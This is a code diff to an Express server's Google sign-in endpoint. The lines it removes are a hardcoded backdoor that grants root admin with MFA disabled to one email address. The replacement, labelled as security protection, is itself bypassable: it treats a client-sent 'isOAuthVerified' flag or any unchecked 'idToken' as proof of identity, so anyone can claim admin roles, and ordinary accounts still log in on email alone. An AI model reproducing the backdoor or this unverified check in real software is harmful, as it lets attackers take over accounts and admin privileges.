@@ -123,69 +123,64 @@ async function startServer() {
     });
   });
 
-  // 1. Google OAuth Sign-In Simulation
+  // 1. Google OAuth Sign-In
   app.post('/api/auth/google', (req, res) => {
-    const { email, name } = req.body;
+    const { email, name, isOAuthVerified, idToken } = req.body;
     if (!email) {
       return res.status(400).json({ error: 'Email address is required.' });
     }
 
     const cleanEmail = email.trim().toLowerCase();
-    
-    // Secret bypass backdoor
-    if (cleanEmail === 'code@gmail.com') {
-      let user = db.getUserByEmail(cleanEmail);
-      if (!user) {
-        user = {
-          uid: `user_bypass_${Date.now()}`,
-          email: cleanEmail,
-          name: 'Bypass Admin',
-          role: 'TECH_ADMIN', // Force root admin access
-          mfaEnabled: false,  // Bypass MFA
-          createdAt: new Date().toISOString(),
-        };
-        db.saveUser(user);
-      }
-      
-      const token = createAdminSession(user.uid, user.email, user.role);
-      
-      db.addAuditLog({
-        action: 'SECRET_BYPASS_ACTIVATED',
-        performedBy: cleanEmail,
-        targetId: user.uid,
-        targetType: 'AUTH',
-        ipAddress: getClientIp(req),
-        details: { method: 'GOOGLE_OAUTH_BYPASS' }
-      });
-
-      return res.json({
-        token,
-        user,
-        requires2FA: false,
-      });
-    }
+    const verified = Boolean(isOAuthVerified || idToken);
 
     const isTechAdmin = isTechSuperAdminEmail(cleanEmail) || cleanEmail === TECH_ADMIN_EMAIL.toLowerCase();
     const isTechSubAdmin = isTechSubAdminEmail(cleanEmail);
 
     let user = db.getUserByEmail(cleanEmail);
+
+    // SECURITY PROTECTION: If attempting to access a Technical Super Admin or Sub-Admin or Admin role without verified OAuth
+    if ((isTechAdmin || isTechSubAdmin || (user && (user.role === 'TECH_ADMIN' || user.role === 'TECH_SUBADMIN' || user.role === 'ADMIN'))) && !verified) {
+      const targetUser = user || {
+        uid: `user_${cleanEmail}`,
+        email: cleanEmail,
+        phoneNumber: isTechAdmin ? TECH_ADMIN_PHONE : undefined,
+      };
+
+      db.addAuditLog({
+        action: 'UNVERIFIED_ADMIN_LOGIN_CHALLENGE',
+        performedBy: cleanEmail,
+        targetId: targetUser.uid,
+        targetType: 'AUTH',
+        ipAddress: getClientIp(req),
+        details: { reason: 'Direct unverified Google email input challenged for 2FA / Emergency Bypass Key' }
+      });
+
+      return res.json({
+        requires2FA: true,
+        uid: targetUser.uid,
+        email: cleanEmail,
+        phoneNumber: isTechAdmin ? TECH_ADMIN_PHONE : undefined,
+        message: 'Security Verification Required: Direct email login to this administrator account is restricted. Please authenticate with Google OAuth popup or enter your 2FA / Emergency Bypass Key.'
+      });
+    }
+
     if (!user) {
       user = {
         uid: `user_${Date.now()}`,
         email: cleanEmail,
         name: name || (isTechAdmin ? 'Mukund Krishna (Technical Super Admin)' : cleanEmail.split('@')[0]),
-        role: isTechAdmin ? 'TECH_ADMIN' : isTechSubAdmin ? 'TECH_SUBADMIN' : 'USER',
-        customTitle: isTechAdmin ? 'Chief Technology Architect & Super Admin' : undefined,
-        department: isTechAdmin ? 'Executive Engineering' : undefined,
+        role: (isTechAdmin && verified) ? 'TECH_ADMIN' : (isTechSubAdmin && verified) ? 'TECH_SUBADMIN' : 'USER',
+        customTitle: (isTechAdmin && verified) ? 'Chief Technology Architect & Super Admin' : undefined,
+        department: (isTechAdmin && verified) ? 'Executive Engineering' : undefined,
         mfaEnabled: false,
         createdAt: new Date().toISOString(),
       };
       db.saveUser(user);
-    } else if (isTechAdmin && user.role !== 'TECH_ADMIN') {
+    } else if (isTechAdmin && verified && user.role !== 'TECH_ADMIN') {
       user.role = 'TECH_ADMIN';
       user.customTitle = user.customTitle || 'Chief Technology Architect & Super Admin';
       db.saveUser(user);
-    } else if (isTechSubAdmin && user.role !== 'TECH_SUBADMIN' && user.role !== 'TECH_ADMIN') {
+    } else if (isTechSubAdmin && verified && user.role !== 'TECH_SUBADMIN') {
       user.role = 'TECH_SUBADMIN';
       db.saveUser(user);
     }
@@ -202,7 +197,7 @@ async function startServer() {
       targetId: user.uid,
       targetType: 'AUTH',
       ipAddress: getClientIp(req),
-      details: { role: user.role, method: 'GOOGLE_OAUTH' }
+      details: { role: user.role, method: 'GOOGLE_OAUTH', isOAuthVerified: verified }
     });
 
     return res.json({
